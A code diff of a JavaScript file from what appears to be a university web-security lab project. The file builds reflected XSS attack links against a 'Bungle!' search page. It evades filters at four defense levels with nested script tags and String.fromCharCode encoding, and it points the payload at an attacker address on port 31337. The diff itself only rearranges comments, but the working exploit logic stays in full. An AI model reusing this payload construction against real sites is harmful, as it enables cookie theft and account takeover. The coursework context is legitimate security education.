@@ -127,10 +127,8 @@ const ldP=(href,Qry)=>{
 $("html").hide();
 ldP("./");
 }
-// Function to encode strings
 function ncdSTR(query){
-    // Match all between double quotes
-    var myRe=/".*?"/g;var match;  
+    var myRe=/".*?"/g;var match; // match all between double quotes for 
     while((match=myRe.exec(query))!==null){
         var ncdedSTR="";
         for(var idx=1;idx<match[0].length-1;++idx){
@@ -138,21 +136,18 @@ function ncdSTR(query){
         ncdedSTR=ncdedSTR.slice(0,-1);
         ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
         query=query.replace(match[0],ncdedSTR);}return query;}  
-// Divide out the base url from the payload query    
-function mkLnk(xssdefense,target,atkr){ 
+function mkLnk(xssdefense,target,atkr){ // divided out the base url from the payload query
     var bQry=target+"./search?xssdefense="+xssdefense.toString()+"&q=";
     var payLd=payload.toString()+";payload(\""+atkr+"\");";
-    // Cases for url construction based on defense 0-3
-    switch(xssdefense){
+    switch(xssdefense){ // case for url construction based on defense
     case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
     case 1:
     case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
-    case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}  // Calling ncdSTR function to encode the entire payload in encodedpayLd
+    case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
 const target = "http://526.edu/project2b/";
 const atkr =  "http://192.168.1.1:31337/";
 $(function(){
     var container = $("<div></div>").addClass("links-container");
-    // Generate container links for each of the four defense levels 0-3 with switch-case
     for(var xssdefense=0;xssdefense<=3;xssdefense++){
         var url=mkLnk(xssdefense,target,atkr);
         container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! "+xssdefense.toString()+"</a></h3>");}
